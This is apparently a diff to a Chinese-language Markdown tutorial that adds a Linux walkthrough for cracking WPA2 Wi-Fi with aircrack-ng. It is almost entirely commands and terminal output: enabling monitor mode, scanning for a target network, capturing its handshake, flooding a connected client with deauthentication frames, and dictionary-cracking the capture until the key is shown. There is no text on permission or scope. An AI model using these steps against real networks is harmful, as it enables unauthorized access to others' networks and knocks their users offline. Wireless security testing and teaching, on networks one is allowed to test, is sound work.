@@ -4,13 +4,123 @@
 
 ### Linux 篇（推荐）
 
+### 1. 
+
 * 使用相应包管理工具安装，例如 Debian/Ubuntu 使用 apt 安装：
 
 ~~~shell
 sudo apt install aircrack-ng
 ~~~
 
-待续...
+### 2.
+
+~~~
+netcon@conwlt:~/workspace$ sudo airmon-ng
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
+~~~
+
+~~~
+netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
+
+		(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)
+		(mac80211 station mode vif disabled for [phy0]wlp8s0)
+~~~
+
+~~~
+netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon
+
+ CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  
+                
+ 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   
+~~~
+
+~~~
+netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon
+
+
+ CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  
+                
+ 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657
+
+~~~
+
+
+~~~
+netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
+18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6
+18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]
+18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]
+18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]
+...
+~~~
+
+
+~~~
+netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/huanying-0.txt android-01.cap 
+Opening android-01.cap
+Read 675 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening android-01.cap
+Reading packets, please wait...
+
+                                 Aircrack-ng 1.2 rc4
+
+      [00:00:00] 12/2492 keys tested (828.33 k/s) 
+
+      Time left: 2 seconds                                       0.48%
+
+                          KEY FOUND! [ 1234567890 ]
+
+
+      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D 
+                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 
+
+      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED 
+                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 
+                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 
+                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A 
+
+      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE 
+~~~
+
+~~~
+netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
+
+		(mac80211 station mode vif enabled on [phy0]wlp8s0)
+
+		(mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)
+
+~~~
+
 
 ## MAC OS 篇
 
